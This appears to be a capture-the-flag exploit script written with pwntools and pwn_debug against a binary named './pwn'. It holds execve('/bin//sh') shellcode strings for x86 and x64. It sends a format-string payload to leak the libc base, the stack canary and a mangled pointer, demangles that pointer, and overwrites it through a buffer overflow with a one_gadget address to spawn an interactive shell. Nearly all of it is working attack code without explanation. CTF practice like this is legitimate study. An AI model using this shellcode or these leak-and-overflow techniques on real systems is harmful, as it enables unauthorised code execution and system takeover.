from pwn_debug import *


pdbg=pwn_debug("./pwn")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")

pdbg.remote()

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)

def bpp():
	bp([])
	input()
#elf=pdbg.elf
#libc=pdbg.libc
sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

sl("%p%p%p%p%p%p%p%p%p%p%paaaa%p%p%p%p%p%p%p%p%p%p%pbbbb%p")

all=ru('aaaa')
addr=int(all[:14],16)+0x7ffff77c5000-0x7ffff7bb28d0
print hex(addr)

canary=int(r(18),16)
print hex(canary)

ru('bbbb')
leak=int(r(),16)
tmp=leak&0x1ffff
leak=(((leak>>17)&0x7fffffffffff)|(tmp<<47))^(addr-0x1100)
print hex(leak)


one=addr+0x10a38c # 0x4f322  0x10a38c
tmp=leak^(addr+0x7f3b0dbcdc80-0x7f3b0d7cc000)^one
pay='a'*0x38+p64(canary)+'a'*0x800+p64(tmp)*(0x100)
sl(pay)


it()
